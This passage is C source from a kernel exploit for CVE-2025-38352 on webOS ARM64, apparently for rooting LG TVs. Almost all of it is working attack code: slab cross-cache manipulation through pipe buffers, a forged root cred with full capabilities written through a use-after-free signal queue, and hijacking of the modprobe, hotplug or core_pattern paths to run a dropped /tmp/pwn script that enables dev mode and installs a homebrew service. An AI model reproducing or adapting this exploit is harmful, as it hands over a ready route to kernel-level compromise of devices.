        SYSCHK(read(exploit_child_to_parent[0], &m, 1)); // stage 2 - sync 5
    }

    printf("\n[+] Stage 3 - Cross-cache new sigqueue's slab to second pipe buffer\n");

    // Clean up ALL Stage 2 prealloc timers so the cross_cache_timers array is
    // available for reuse. This also frees other_sigqueue's slab objects.
    cleanup_crosscache_sigqueues();

    // All Stage 3 operations run on CPU 2 for per-CPU slab consistency.
    pin_on_cpu(2);

    // Allocate slabs 0-2 (preallocs). Slab 3 has 25 objects at slots 0-24.
    sigqueue_crosscache_preallocs();

    // Send SIGRTMIN+1 to buggy_pid. The new sigqueue goes to slab 3 slot 25.
    // Kernel does list_add_tail: UAF.next = new_sigqueue_addr.
    // Pending list: head -> UAF(SIGUSR2) -> new_sigqueue(SIGRTMIN+1) -> head
    SYSCHK(syscall(__NR_tkill, buggy_pid, SIGRTMIN+1));

    // Peek pipe buffer to learn new_addr from UAF.next (keeps page alive).
    peek_pipe(realloc_pipefds, PAGE_SIZE, buf);
    size_t new_addr = *((size_t *)(buf + uaf_sigqueue_offset + SIGQUEUE_list_next_offset));

    if (!is_kernel_ptr(new_addr)) {
        printf("\t[!] FATAL: new_addr is not a kernel pointer: 0x%lx\n", new_addr);
        printf("\t[!] UAF.next was not updated by the kernel.\n");
        fflush(stdout);
        return;
    }

    size_t new_page_offset = new_addr & 0xfff;
    printf("\t[+] new_addr = 0x%lx (page offset 0x%lx)\n", new_addr, new_page_offset);
    fflush(stdout);

    // Fill remaining slots on slab 3 (postallocs). Slab 3 is now full (51 objects).
    sigqueue_crosscache_postallocs();

    // Allocate the second pipe for reclaiming the cross-cache page.
    int other_pipefds[2];
    SYSCHK(pipe(other_pipefds));

    int flags2 = fcntl(other_pipefds[0], F_GETFL, 0);
    SYSCHK(fcntl(other_pipefds[0], F_SETFL, flags2 | O_NONBLOCK));
    flags2 = fcntl(other_pipefds[1], F_GETFL, 0);
    SYSCHK(fcntl(other_pipefds[1], F_SETFL, flags2 | O_NONBLOCK));

    // Dequeue SIGRTMIN+1 to free the new sigqueue from slab 3.
    // Slab 3 goes from 51 to 50 live objects (25 prealloc + 25 postalloc).
    // Pending list returns to: head -> UAF(SIGUSR2) -> head
    printf("\t[+] Dequeuing SIGRTMIN+1 (2nd time) to free new sigqueue from slab 3...\n");
    fflush(stdout);
    if (parent_owns_uaf_sigqueue) {
        SYSCHK(read(sigrt1_sfd, &si, sizeof(si)));
    } else {
        SYSCHK(write(exploit_parent_to_child[1], SUCCESS_STR, 1)); // stage 3 - sync 1
        SYSCHK(read(exploit_child_to_parent[0], &m, 1)); // stage 3 - sync 2
    }

    // Free slab 3's remaining 50 timer objects to make it fully free.
    printf("\t[+] Freeing slab 3 page...\n");
    fflush(stdout);
    free_crosscache_sigqueues();

    // Immediately reclaim the freed page as a second pipe buffer.
    // CRITICAL: Prepare fake cred data BEFORE the pipe write so the initial
    // reclaim AND data setup happen in ONE write. This way we NEVER need to
    // read_pipe (which would release the page), keeping fake_cred_addr valid.
    char other_buf[PAGE_SIZE];
    memset(other_buf, 0, PAGE_SIZE);

    printf("\t[+] Writing fake cred at page offset 0x%lx\n", new_page_offset);

    if ((new_page_offset % SIGQUEUE_obj_size) != 0) {
        printf("\t[!] WARNING: new_page_offset not aligned to SIGQUEUE_obj_size (0x%lx)\n",
               new_page_offset);
        printf("\t[!]   If Stage 5 hangs, verify SIGQUEUE_obj_size and cross-cache timing\n");
    }

    // offset 0: usage (8 bytes) = task_pending_list_addr
    //   - Serves double duty as list.next for kernel traversal (points back to
    //     head, which terminates list_for_each_entry)
    //   - As cred.usage, it's a large positive value (valid refcount)
    *((size_t *)(other_buf + new_page_offset + 0)) = task_pending_list_addr;

    // offsets 8-31: uid/gid/suid/sgid/euid/egid all 0 (already zeroed by memset)
    //   - uid/gid at 8-15 will be overwritten by list_del_init side effect
    //   - euid at 24 = 0 (ROOT!) - untouched by list_del_init
    //   - egid at 28 = 0 (ROOT!) - untouched by list_del_init

    // offsets 32-39: fsuid/fsgid = 0 (already zeroed)

    // offset 40: securebits = 0 (already zeroed)

    // capabilities: set cap_permitted and cap_effective to all 1s for full caps
    // cap_inheritable at offset 44 (8 bytes) - leave 0
    // cap_permitted at offset 52 (8 bytes) - all 1s
    *((uint64_t *)(other_buf + new_page_offset + 52)) = 0xFFFFFFFFFFFFFFFFULL;
    // cap_effective at offset 60 (8 bytes) - all 1s
    *((uint64_t *)(other_buf + new_page_offset + 60)) = 0xFFFFFFFFFFFFFFFFULL;
    // cap_bset at offset 68 (8 bytes) - all 1s
    *((uint64_t *)(other_buf + new_page_offset + 68)) = 0xFFFFFFFFFFFFFFFFULL;
    // cap_ambient at offset 76 (8 bytes) - leave 0

    // Single write: reclaims the slab page AND sets up fake cred data.
    // The pipe now holds the physical page at new_addr with our fake cred.
    // We NEVER read from this pipe, so the page is NEVER released.
    ssize_t wrote2 = SYSCHK(write(other_pipefds[1], other_buf, PAGE_SIZE));
    if (wrote2 != PAGE_SIZE) {
        printf("\t[!] WARNING: short write to other pipe: %zd/%llu bytes\n",
               wrote2, (unsigned long long)PAGE_SIZE);
    }

    printf("\t[+] Reclaimed slab 3 page as second pipe buffer (with fake cred)\n");
    fflush(stdout);

    size_t fake_cred_addr = new_addr;
    printf("\t[+] fake_cred_addr = 0x%lx (= new_addr from Stage 3 SIGRTMIN+1)\n", fake_cred_addr);
    fflush(stdout);

    // =========================================================================
    // Stage 4 - Set up arbitrary write via UAF sigqueue
    // =========================================================================
    printf("\n[+] Stage 4 - Set up arbitrary write via UAF sigqueue\n");
    fflush(stdout);

    // ============================================================================
    // Jan 27th 2026 - VERIFIED Offset Calculation from LG Kernel Source
    // ============================================================================
    //
    // Source: linux-rockhopper/include/linux/sched.h lines 894-936
    // Config: linux-rockhopper/.config (actual config file, not defconfig)
    // Kernel: 5.4.268
    //
    // VERIFIED CONFIG OPTIONS (from actual .config):
    //   CONFIG_KEYS=y              -> cached_requested_key INCLUDED
    //   CONFIG_SYSVIPC=y           -> sysvsem + sysvshm INCLUDED
    //   CONFIG_DETECT_HUNG_TASK=n  -> last_switch_* EXCLUDED
    //
    // TYPE SIZES VERIFIED:
    //   sigset_t = 8 bytes (uapi/asm-generic/signal.h: _NSIG=64, 64/64=1 ulong)
    //   struct sysv_sem = 8 bytes (linux/sem.h: 1 pointer)
    //   struct sysv_shm = 16 bytes (linux/shm.h: 1 list_head)
    //
    // FIELD-BY-FIELD (every byte accounted for):
    //   +0   cached_requested_key *    8 bytes  (CONFIG_KEYS=y)
    //   +8   comm[16]                 16 bytes
    //   +24  nameidata *               8 bytes
    //   +32  sysvsem                   8 bytes  (CONFIG_SYSVIPC=y)
    //   +40  sysvshm                  16 bytes  (CONFIG_SYSVIPC=y)
    //   +56  fs *                      8 bytes
    //   +64  files *                   8 bytes
    //   +72  nsproxy *                 8 bytes
    //   +80  signal *                  8 bytes
    //   +88  sighand *                 8 bytes
    //   +96  blocked (sigset_t)        8 bytes
    //   +104 real_blocked              8 bytes
    //   +112 saved_sigmask             8 bytes
    //   +120 pending                   <- TARGET
    //
    // FINAL OFFSET: 0x80 (128 bytes)  (previously thought it was 0x78)
    //
    // The 120 bytes above count from cached_requested_key to pending.
    // But real_cred (8 bytes) sits between cred and cached_requested_key:
    //   cred -> real_cred (8) -> cached_requested_key -> ... -> pending
    //
    // Trying different offsets:
    //   0x70 (112) = hang (nsproxy?)
    //   0x78 (120) = no crash, no root (cached_requested_key - harmless)
    //   0x80 (128) = CRASH before page fix, NOW CORRECT (cred)
    //   0x88 (136) = no crash, no root (real_cred)
    //
    // 0x78 was wrong: it targeted cached_requested_key, not cred.
    // 0x80 crashed before because fake_cred page was freed (page mismatch bug).
    // With page fix (tee + single-write), 0x80 should work.
    // ============================================================================
    size_t cred_offset = 0x80;
    size_t task_cred_ptr_addr = task_pending_list_addr - cred_offset;

    printf("\t[+] task_pending_list_addr = 0x%lx\n", task_pending_list_addr);
    printf("\t[+] cred_offset = 0x%lx (%zu bytes)\n", cred_offset, cred_offset);
    printf("\t[+] task_cred_ptr_addr = 0x%lx\n", task_cred_ptr_addr);
    printf("\t[+] fake_cred_addr = 0x%lx\n", fake_cred_addr);
    printf("\t[+] Will write: *0x%lx = 0x%lx\n", task_cred_ptr_addr, fake_cred_addr);
    fflush(stdout);

    // Verify SIGUSR2 is still pending (it was never dequeued since Stage 1!)
    if (parent_owns_uaf_sigqueue) {
        sigset_t pending_check;
        sigpending(&pending_check);
        if (!sigismember(&pending_check, SIGUSR2)) {
            printf("\t[!] CRITICAL: SIGUSR2 not pending! Cannot proceed.\n");
            fflush(stdout);
            return;
        }
        printf("\t[+] SIGUSR2 still pending from Stage 1\n");
    }

    // Set up malicious pointers in UAF sigqueue (pipe buffer A)
    //
    // When dequeued, kernel does list_del_init():
    //   prev->next = next  =>  *task_cred_ptr_addr = fake_cred_addr  (THE WRITE!)
    //   next->prev = prev  =>  *fake_cred_addr+8 = task_cred_ptr_addr (side effect)
    //   entry->next = entry (INIT_LIST_HEAD)
    //   entry->prev = entry (INIT_LIST_HEAD)
    //
    // CRITICAL: This is the ONLY read_pipe on realloc_pipefds in the entire exploit.
    // All earlier reads used peek_pipe (tee-based) to keep the original page alive.
    // The read releases PAGE_A, and the immediate write_pipe should get it back
    // via LIFO page recycling (same CPU, no intervening allocations).
    //
    // OPTIMIZATION: Pre-prepare the modified buffer BEFORE read_pipe so the window
    // between page free (read_pipe) and page reclaim (write_pipe) contains ZERO
    // userspace computation. During this window, a hardware interrupt on our CPU
    // could steal the freed page from the per-CPU page list (pcplist). If that
    // happens, write_pipe gets a different physical page, but the kernel's UAF
    // pointer still references the old page → infinite loop under siglock during
    // Stage 5 dequeue (soft lockup / hang).

    // Step 1: Non-destructive peek to get current pipe data
    char prepared_buf[PAGE_SIZE];
    peek_pipe(realloc_pipefds, PAGE_SIZE, prepared_buf);

    // Step 2: Modify the copy with malicious pointers (no time pressure here)
    *((size_t *)(prepared_buf + uaf_sigqueue_offset + SIGQUEUE_list_next_offset)) = fake_cred_addr;
    *((size_t *)(prepared_buf + uaf_sigqueue_offset + SIGQUEUE_list_prev_offset)) = task_cred_ptr_addr;
    *((int *)(prepared_buf + uaf_sigqueue_offset + SIGQUEUE_info_si_signo_offset)) = SIGUSR2;
    *((int *)(prepared_buf + uaf_sigqueue_offset + SIGQUEUE_flags_offset)) = SIGQUEUE_PREALLOC;

    // Step 3: Elevate to SCHED_FIFO to prevent other tasks from preempting us.
    // Hardware interrupts can still fire, but this reduces page allocation pressure
    // from other tasks on our CPU. May fail with EPERM (prisoner user) - that's OK.
    struct sched_param fifo_param = { .sched_priority = 1 };
    int had_fifo = (sched_setscheduler(0, SCHED_FIFO, &fifo_param) == 0);
    if (had_fifo)
        printf("\t[+] SCHED_FIFO set for critical section\n");
    else
        printf("\t[-] SCHED_FIFO unavailable - proceeding anyway\n");

    // Step 4: Drain pending work on this CPU before the critical window
    sched_yield();

    // Step 5: CRITICAL WINDOW - read (frees page) then write (reclaims page)
    // No userspace computation between these two syscalls!
    read_pipe(realloc_pipefds, PAGE_SIZE, 0, buf);
    write_pipe(realloc_pipefds, PAGE_SIZE, 0, prepared_buf);

    // Step 6: Restore normal scheduling
    if (had_fifo) {
        struct sched_param normal_param = { .sched_priority = 0 };
        sched_setscheduler(0, SCHED_OTHER, &normal_param);
    }

    // Verify using peek_pipe (tee-based) to avoid releasing the page again
    printf("\t[DEBUG] Verifying sigqueue fields in pipe buffer:\n");
    char *verify_buf = malloc(PAGE_SIZE);
    peek_pipe(realloc_pipefds, PAGE_SIZE, verify_buf);

    size_t verify_next = *((size_t *)(verify_buf + uaf_sigqueue_offset + SIGQUEUE_list_next_offset));
    size_t verify_prev = *((size_t *)(verify_buf + uaf_sigqueue_offset + SIGQUEUE_list_prev_offset));
    int verify_flags = *((int *)(verify_buf + uaf_sigqueue_offset + SIGQUEUE_flags_offset));
    int verify_signo = *((int *)(verify_buf + uaf_sigqueue_offset + SIGQUEUE_info_si_signo_offset));

    printf("\t[DEBUG]   list.next  = 0x%lx (expected 0x%lx) %s\n",
           verify_next, fake_cred_addr, verify_next == fake_cred_addr ? "OK" : "MISMATCH");
    printf("\t[DEBUG]   list.prev  = 0x%lx (expected 0x%lx) %s\n",
           verify_prev, task_cred_ptr_addr, verify_prev == task_cred_ptr_addr ? "OK" : "MISMATCH");
    printf("\t[DEBUG]   flags      = %d (expected %d) %s\n",
           verify_flags, SIGQUEUE_PREALLOC, verify_flags == SIGQUEUE_PREALLOC ? "OK" : "MISMATCH");
    printf("\t[DEBUG]   si_signo   = %d (expected %d = SIGUSR2) %s\n",
           verify_signo, SIGUSR2, verify_signo == SIGUSR2 ? "OK" : "MISMATCH");

    if (verify_next != fake_cred_addr || verify_prev != task_cred_ptr_addr) {
        printf("\t[!] FATAL: List pointers didn't persist correctly!\n");
        printf("\t[!] The UAF sigqueue may have been reclaimed or corrupted.\n");
        free(verify_buf);
        return;
    }

    if (verify_signo != SIGUSR2) {
        printf("\t[!] CRITICAL: si_signo mismatch!\n");
        printf("\t[!] Fix SIGQUEUE_info_si_signo_offset (currently %d)\n", SIGQUEUE_info_si_signo_offset);
        free(verify_buf);
        return;
    }

    printf("\t[DEBUG]   All sigqueue fields verified OK\n");

    // NOTE: No write_pipe needed - peek_pipe kept the page in the pipe.
    free(verify_buf);
    fflush(stdout);

    // =========================================================================
    // Stage 5 - Trigger arbitrary write via signal dequeue
    // =========================================================================
    printf("\n[+] Stage 5 - Trigger arbitrary write via signal dequeue\n");
    printf("\t[+] Dequeuing ORIGINAL SIGUSR2 from Stage 1 (never dequeued until now)\n");
    printf("\t[+] This triggers list_del_init: *0x%lx = 0x%lx\n",
           task_cred_ptr_addr, fake_cred_addr);
    fflush(stdout);

    if (parent_owns_uaf_sigqueue) {
        // Make signalfd non-blocking to detect hangs
        int sfd_flags = SYSCHK(fcntl(sigusr2_sfd, F_GETFL, 0));
        SYSCHK(fcntl(sigusr2_sfd, F_SETFL, sfd_flags | O_NONBLOCK));

        // Use poll with timeout instead of blocking read
        struct pollfd dequeue_pfd = { .fd = sigusr2_sfd, .events = POLLIN };
        int dequeue_poll_ret = poll(&dequeue_pfd, 1, 5000);

        struct signalfd_siginfo si2;
        ssize_t read_ret = -1;
        int saved_errno = 0;

        if (dequeue_poll_ret == 0) {
            printf("\t[!] TIMEOUT: poll() waited 5+ seconds\n");
            printf("\t[!] Kernel likely stuck in list traversal or list_del_init\n");
            printf("\t[!] Possible causes:\n");
            printf("\t[!]   1. fake_cred list.next doesn't point back to head\n");
            printf("\t[!]   2. Pipe buffer page was reclaimed by something else\n");
            SYSCHK(fcntl(sigusr2_sfd, F_SETFL, sfd_flags));
            return;
        } else if (dequeue_poll_ret < 0) {
            saved_errno = errno;
            printf("\t[!] poll() failed: errno=%d (%s)\n", saved_errno, strerror(saved_errno));
            SYSCHK(fcntl(sigusr2_sfd, F_SETFL, sfd_flags));
            return;
        }

        printf("\t[DEBUG] poll() returned %d, revents=0x%x\n", dequeue_poll_ret, dequeue_pfd.revents);

        // Dequeue the signal - this triggers the arbitrary write!
        printf("\t[DEBUG] SIGUSR2 = %d, sigusr2_sfd = %d\n", SIGUSR2, sigusr2_sfd);
        printf("\t[DEBUG] Key addresses for list_del_init:\n");
        printf("\t[DEBUG]   UAF.prev (entry->prev) = task_cred_ptr = 0x%lx\n", task_cred_ptr_addr);
        printf("\t[DEBUG]   UAF.next (entry->next) = fake_cred     = 0x%lx\n", fake_cred_addr);
        printf("\t[DEBUG]   fake_cred[0] should be task_pending_list = 0x%lx\n", task_pending_list_addr);
        printf("\t[DEBUG] Expected writes:\n");
        printf("\t[DEBUG]   *(0x%lx) = 0x%lx  (task->cred = fake_cred)\n", task_cred_ptr_addr, fake_cred_addr);
        printf("\t[DEBUG]   *(0x%lx) = 0x%lx  (fake_cred.prev = task_cred_ptr)\n", fake_cred_addr + 8, task_cred_ptr_addr);

        // Re-verify pipe buffers are still holding the pages
        printf("\t[DEBUG] Verifying pipe buffers still valid...\n");
        fflush(stdout);

        // Quick check: can we still read/write the first pipe buffer?
        char verify_byte;
        ssize_t peek_ret = read(realloc_pipefds[0], &verify_byte, 0);
        printf("\t[DEBUG]   realloc_pipe read(0) = %zd (errno=%d)\n", peek_ret, errno);

        printf("\t[DEBUG] About to call read(sigusr2_sfd) - this triggers list_del_init...\n");
        printf("\t[DEBUG] NOTE: If it hangs here, the exploit has failed and you must start over.\n");
        fflush(stdout);
        errno = 0;
        read_ret = read(sigusr2_sfd, &si2, sizeof(si2));
        saved_errno = errno;

        printf("\t[DEBUG] read() returned %zd, errno=%d (%s)\n", read_ret, saved_errno, strerror(saved_errno));

        // Restore blocking mode
        SYSCHK(fcntl(sigusr2_sfd, F_SETFL, sfd_flags));

        printf("\t[DEBUG] Blocking mode restored\n");

        if (read_ret > 0) {
            printf("\t[+] Signal dequeued successfully! (read %zd bytes)\n", read_ret);

            // DIAGNOSTIC: Check if list_del_init modified OUR pipe buffer page
            // If the kernel used our page, UAF entry should now be INIT_LIST_HEAD'd:
            //   list.next = self, list.prev = self
            // If the kernel used a DIFFERENT (freed) page, our pipe buffer is unchanged:
            //   list.next = fake_cred_addr, list.prev = task_cred_ptr_addr
            char *post_buf = malloc(PAGE_SIZE);
            read_pipe(realloc_pipefds, PAGE_SIZE, 0, post_buf);
            size_t post_next = *((size_t *)(post_buf + uaf_sigqueue_offset + SIGQUEUE_list_next_offset));
            size_t post_prev = *((size_t *)(post_buf + uaf_sigqueue_offset + SIGQUEUE_list_prev_offset));
            printf("\t[DEBUG] POST-DEQUEUE pipe buffer check:\n");
            printf("\t[DEBUG]   list.next = 0x%lx\n", post_next);
            printf("\t[DEBUG]   list.prev = 0x%lx\n", post_prev);
            if (post_next == fake_cred_addr && post_prev == task_cred_ptr_addr) {
                printf("\t[DEBUG]   *** POINTERS UNCHANGED - kernel used a DIFFERENT page! ***\n");
                printf("\t[DEBUG]   *** The pipe read/write cycle lost the original UAF page ***\n");
            } else {
                printf("\t[DEBUG]   Pointers changed by kernel (list_del_init applied to our page)\n");
            }
            free(post_buf);
            fflush(stdout);

            printf("\t[+] Arbitrary write completed: task->cred now points to fake_cred\n");
        } else {
            printf("\t[!] Signal dequeue FAILED: read() returned %zd, errno=%d (%s)\n",
                   read_ret, saved_errno, strerror(saved_errno));
            return;
        }

        fflush(stdout);

        // Check if we got root!
        printf("\n\t[+] Checking privileges...\n");
        uid_t my_euid = geteuid();
        uid_t my_uid_check = getuid();
        printf("\t[+] Current EUID: %d, UID: %d\n", my_euid, my_uid_check);

        if (my_euid == 0) {
            printf("\n");
            printf("\t ██████╗  ██████╗  ██████╗ ████████╗    ██╗\n");
            printf("\t ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██║\n");
            printf("\t ██████╔╝██║   ██║██║   ██║   ██║       ██║\n");
            printf("\t ██╔══██╗██║   ██║██║   ██║   ██║       ╚═╝\n");
            printf("\t ██║  ██║╚██████╔╝╚██████╔╝   ██║       ██╗\n");
            printf("\t ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       ╚═╝\n");
            printf("\n");
            printf("\t[+] ROOT ACHIEVED! EUID = 0\n");
            fflush(stdout);

            // Can't call setresuid/fork/exec/system - fake cred has NULL
            // user_ns/user/group_info, any cred clone path crashes.
            // Strategy: overwrite a kernel usermodehelper path to /tmp/pwn,
            // then trigger it. Kernel runs /tmp/pwn with init_cred (valid root).
            // /tmp/pwn does: enable_devmode + install/elevate HBC + remove Dev Mode app.
            int done = 0;

            // Try 1: modprobe (needs CONFIG_MODULES=y) - //THIS WORKS!!
            int mp_fd = open("/proc/sys/kernel/modprobe", O_WRONLY);
            if (mp_fd >= 0) {
                write(mp_fd, "/tmp/pwn", 8);
                close(mp_fd);
                printf("\t[+] modprobe -> /tmp/pwn\n");
                fflush(stdout);
                socket(44, SOCK_STREAM, 0);
                usleep(500000);
                done = 1;
            }

            // Try 2: hotplug (uevent_helper) + trigger via sysfs
            if (!done) {
                int uh_fd = open("/proc/sys/kernel/hotplug", O_WRONLY);
                if (uh_fd >= 0) {
                    write(uh_fd, "/tmp/pwn", 8);
                    close(uh_fd);
                    printf("\t[+] hotplug -> /tmp/pwn\n");
                    fflush(stdout);
                    int ev_fd = open("/sys/class/mem/null/uevent", O_WRONLY);
                    if (ev_fd >= 0) {
                        write(ev_fd, "add", 3);
                        close(ev_fd);
                        usleep(500000);
                        done = 1;
                    }
                }
            }

            // Try 3: core_pattern (user triggers manually)
            if (!done) {
                int cp_fd = open("/proc/sys/kernel/core_pattern", O_WRONLY);
                if (cp_fd >= 0) {
                    write(cp_fd, "|/tmp/pwn", 9);
                    close(cp_fd);
                    printf("\t[+] core_pattern -> |/tmp/pwn\n");
                    printf("\t[+] Need manual trigger - crash any process\n");
                }
            }

            if (done) {
                printf("\t[+] Rooting payload executed!\n");
                printf("\t[+] Waiting for /tmp/pwn to finish...\n");
                printf("\t[+] May take up to 5 minutes to finish.\n");
                fflush(stdout);

                // Poll for /tmp/pwn completion (look for "done" in log).
                // open/read/close are safe with fake cred — proven by modprobe
                // write + socket trigger already succeeding (same LSM hooks).
                int pwn_done = 0;
                for (int i = 0; i < 300 && !pwn_done; i++) {
                    sleep(1);
                    int log_fd = open("/tmp/pwn.log", O_RDONLY);
                    if (log_fd >= 0) {
                        char logbuf[4096];
                        int n = read(log_fd, logbuf, sizeof(logbuf) - 1);
                        close(log_fd);
                        if (n > 0) {
                            logbuf[n] = '\0';
                            if (strstr(logbuf, "done")) {
                                printf("\n\t--- /tmp/pwn.log ---\n%s", logbuf);
                                printf("\t--- end ---\n\n");
                                pwn_done = 1;
                            }
                        }
                    }
                }
                if (!pwn_done)
                    printf("\t[!] Timed out waiting for /tmp/pwn (check log manually at /tmp/pwn.log)\n");

                printf("\t[!] Reboot the TV when ready to complete setup.\n");
                printf("\t[!] After reboot, Homebrew Channel provides SSH on port 22.\n");
            } else {
                printf("\t[!] No auto-trigger available\n");
            }
            fflush(stdout);
            // Do NOT call _exit(0) or exit() - do_exit() would dereference
            // fake cred's NULL user_ns/user/group_info pointers → kernel panic.
            // Sleep forever; the exploit process stays alive harmlessly.
            for (;;) sleep(3600);
        } else {
            printf("\t[!] Did not achieve root (EUID still %d)\n", my_euid);
            printf("\t[!] Possible causes:\n");
            printf("\t[!]   1. Wrong cred_offset (currently 0x%lx)\n", cred_offset);
            printf("\t[!]   2. Second cross-cache didn't reclaim the right page\n");
            printf("\t[!]   3. Pipe buffer page was reclaimed by something else\n");
            fflush(stdout);
        }
    } else {
        // Child owns the UAF sigqueue - tell it to dequeue
        SYSCHK(write(exploit_parent_to_child[1], SUCCESS_STR, 1)); // stage 5 - sync 1
        SYSCHK(read(exploit_child_to_parent[0], &m, 1)); // stage 5 - sync 2
    }

    printf("\n[*] Exploit attempt finished.\n");
    fflush(stdout);
    exit(1);
}

int main(int argc, char *argv[]) {
    // exploit process
    char m;

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("\n[*] Chronomaly - CVE-2025-38352 - webOS ARM64\n");

    // Parse optional command-line args: [DELAY] [DELTA] [THRESHOLD]
    // Usage: ./exploit-arm64 [PARENT_SETTIME_DELAY_US] [PARENT_SETTIME_DELAY_US_DELTA] [CPU_USAGE_THRESHOLD]
    int delay_provided = 0, delta_provided = 0, thresh_provided = 0;

    if (argc > 1) {
        PARENT_SETTIME_DELAY_US = atoi(argv[1]);
        delay_provided = 1;
    } else {
        PARENT_SETTIME_DELAY_US = DEFAULT_PARENT_SETTIME_DELAY_US;
    }

    if (argc > 2) {
        PARENT_SETTIME_DELAY_US_DELTA = atoi(argv[2]);
        delta_provided = 1;
    } else if (delay_provided) {
        // Auto-compute delta as DELAY/600, rounded to nearest 5
        int raw = PARENT_SETTIME_DELAY_US / 600;
        PARENT_SETTIME_DELAY_US_DELTA = ((raw + 2) / 5) * 5;
        if (PARENT_SETTIME_DELAY_US_DELTA < 5) PARENT_SETTIME_DELAY_US_DELTA = 5;
    } else {
        PARENT_SETTIME_DELAY_US_DELTA = DEFAULT_PARENT_SETTIME_DELAY_US_DELTA;
    }

    if (argc > 3) {
        CPU_USAGE_THRESHOLD = atoi(argv[3]);
        thresh_provided = 1;
    } else {
        CPU_USAGE_THRESHOLD = DEFAULT_CPU_USAGE_THRESHOLD;
    }

    if (!delay_provided && !delta_provided && !thresh_provided)
        printf("[*] No args provided, using compiled defaults. Usage: %s [DELAY] [DELTA] [THRESHOLD]\n", argv[0]);

    printf("[*] Config: DELAY=%d DELTA=%d THRESH=%d EPOLL=%d SFD=%d\n",
           PARENT_SETTIME_DELAY_US, PARENT_SETTIME_DELAY_US_DELTA,
           CPU_USAGE_THRESHOLD, EPOLL_COUNT, SFD_DUP_COUNT);
    printf("[*] Initializing...\n");
    fflush(stdout);

    // Raise fd limit: each failed attempt leaks ~7 fds (signalfds + pipes).
    // We can't close them because the pipes hold UAF pages the kernel still references.
    struct rlimit rl;
    getrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = rl.rlim_max;
    setrlimit(RLIMIT_NOFILE, &rl);

    // Pre-create payload once at startup (not per-attempt to avoid page allocator noise).
    // After root, kernel's call_usermodehelper runs /tmp/pwn with init_cred (full valid root).
    {
        int pwn_fd = open("/tmp/pwn", O_WRONLY | O_CREAT | O_TRUNC, 0755);
        if (pwn_fd >= 0) {
            const char *s =
                "#!/bin/sh\n"
                // call_usermodehelper has minimal env; set PATH explicitly
                "export PATH=/usr/bin:/usr/sbin:/bin:/sbin\n"
                "L=/tmp/pwn.log\n"
                "log() { echo \"[pwn] $*\" >>$L; }\n"
                "date >$L\n"
                "log 'starting'\n"
                "ELEVATE=/media/developer/apps/usr/palm/services/org.webosbrew.hbchannel.service/elevate-service\n"
                //
                // 1. enable_devmode: directory trick survives rm -f
                //
                "rm -f /var/luna/preferences/devmode_enabled 2>/dev/null\n"
                "mkdir -p /var/luna/preferences/devmode_enabled\n"
                "log 'devmode_enabled created'\n"
                //
                // 2. rename start-devmode.sh EARLY to prevent /media/developer wipe
                //    (most critical persist step after devmode_enabled)
                //
                "SD=/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service/start-devmode.sh\n"
                "if [ -f \"$SD\" ]; then mv \"$SD\" \"${SD}.backup\" 2>/dev/null && log 'start-devmode.sh renamed' || log 'start-devmode.sh rename failed'; fi\n"
                //
                // 3. if HBC already installed, elevate immediately (fast path)
                //
                "if [ -f \"$ELEVATE\" ]; then\n"
                "  \"$ELEVATE\" >>$L 2>&1\n"
                "  log \"elevate-service exit=$?\"\n"
                "fi\n"
                //
                // 4. restart appinstalld so it recognizes devmode for installs
                //    (faultmanager: restart_appinstalld before install_ipk)
                //
                "restart appinstalld >>$L 2>&1\n"
                "sleep 3\n"
                //
                // 5. install HBC if not present (3 retries like faultmanager)
                //    luna-send -i won't exit cleanly; background + SIGKILL
                //
                "if [ ! -f \"$ELEVATE\" ] && [ -f /tmp/hbchannel.ipk ]; then\n"
                "  log 'HBC not found, installing...'\n"
                "  for attempt in 1 2 3; do\n"
                "    luna-send -w 20000 -i 'luna://com.webos.appInstallService/dev/install' "
                "'{\"id\":\"com.ares.defaultName\",\"ipkUrl\":\"/tmp/hbchannel.ipk\",\"subscribe\":true}' "
                ">>$L 2>&1 &\n"
                "    LPID=$!; sleep 15\n"
                "    kill -9 $LPID 2>/dev/null; wait $LPID 2>/dev/null\n"
                "    [ -f \"$ELEVATE\" ] && log \"HBC install ok (attempt $attempt)\" && break\n"
                "    log \"HBC install attempt $attempt failed\"\n"
                "    [ $attempt -lt 3 ] && restart appinstalld >>$L 2>&1 && sleep $((attempt * 2))\n"
                "  done\n"
                // elevate the freshly installed HBC
                "  if [ -f \"$ELEVATE\" ]; then\n"
                "    \"$ELEVATE\" >>$L 2>&1\n"
                "    log \"elevate-service exit=$?\"\n"
                "  else\n"
                "    log 'ERROR: HBC install failed after 3 attempts'\n"
                "  fi\n"
                "fi\n"
                //
                // 6. remove Dev Mode app (best effort, LAST step)
                //    Only if HBC is elevated — don't remove our only SSH access!
                //    faultmanager warns to uninstall but doesn't automate it.
                //    Dev Mode is a store app → use /remove (not /dev/remove).
                //    Use kill -9: SIGTERM doesn't reliably kill luna-send.
                //
                "if [ -f \"$ELEVATE\" ]; then\n"
                "  log 'removing Dev Mode app...'\n"
                "  luna-send -w 10000 -i 'luna://com.webos.appInstallService/remove' "
                "'{\"id\":\"com.palmdts.devmode\",\"subscribe\":true}' >>$L 2>&1 &\n"
                "  LPID=$!; sleep 15\n"
                "  kill -9 $LPID 2>/dev/null; wait $LPID 2>/dev/null\n"
                "  log 'Dev Mode app removal attempted'\n"
                "else\n"
                "  log 'HBC not elevated, skipping Dev Mode removal (uninstall manually before reboot)'\n"
                "fi\n"
                "log 'done'\n";
            write(pwn_fd, s, strlen(s));
            close(pwn_fd);
        }
    }

    // Parent and child setup
    // Use pipes to communicate between parent and child
    SYSCHK(pipe(exploit_child_to_parent));
    SYSCHK(pipe(exploit_parent_to_child));
    
    pid_t pid = SYSCHK(fork());

    if (pid) {
        // exploit parent process
        // Store child's PID so second_stage_exploit can tkill it
        exploit_child_pid = pid;

        pin_on_cpu(0);
        close(exploit_child_to_parent[1]);
        close(exploit_parent_to_child[0]);

        prctl(PR_SET_NAME, "EXPLOIT_PARENT");
        
        pid_t racer_tid;
        
        // Reallocated timer event - use SIGUSR2 as it will be easy to
        // tell we won the race if we ever receive SIGUSR2 on the child thread.
        //
        // Send the signal to ourself specifically, so it uses our pending
        // list instead of the shared pending list.
        struct sigevent realloc_evt = {0};
        realloc_evt.sigev_notify = SIGEV_SIGNAL | SIGEV_THREAD_ID;
